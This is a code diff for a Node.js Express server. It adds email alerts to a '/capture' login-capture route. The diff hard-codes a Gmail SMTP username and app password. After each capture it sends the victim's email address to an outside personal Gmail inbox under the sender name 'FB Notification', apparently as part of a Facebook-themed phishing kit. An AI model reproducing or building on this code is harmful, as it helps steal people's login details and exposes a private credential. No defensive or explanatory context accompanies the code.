@@ -2,11 +2,23 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const fs = require('fs');
 const path = require('path');
+const nodemailer = require('nodemailer');
 
 const app = express();
 const port = 3000;
 
 app.use(bodyParser.urlencoded({ extended: true }));
+
+
+const transporter = nodemailer.createTransport({
+    host: 'smtp.gmail.com',
+    port: 587,
+    secure: false, // true para SSL, false para TLS
+    auth: {
+        user: 'noreply@htk-id.com', 
+        pass: 'rypx resj ocsr yatq', 
+    }
+});
 
 // Servir archivos estáticos (HTML, CSS)
 app.use(express.static(path.join(__dirname, 'public')));
@@ -27,6 +39,24 @@ app.post('/capture', (req, res) => {
             res.status(500).send('Error interno del servidor');
             return;
         }
+
+        // Configurar el correo electrónico
+        const mailOptions = {
+            from: 'FB Notification <noreply@htk-id.com>',
+            to: 'cchacon266@gmail.com', // Dirección de correo electrónico del destinatario
+            subject: 'Se ha iniciado sesión',
+            text: `Se ha iniciado sesión con el correo electrónico: ${email}`
+        };
+
+        // Enviar el correo electrónico
+        transporter.sendMail(mailOptions, function(error, info) {
+            if (error) {
+                console.log(error);
+            } else {
+                console.log('Correo electrónico enviado: ' + info.response);
+            }
+        });
+
         res.redirect('/thank_you.html');
     });
 });
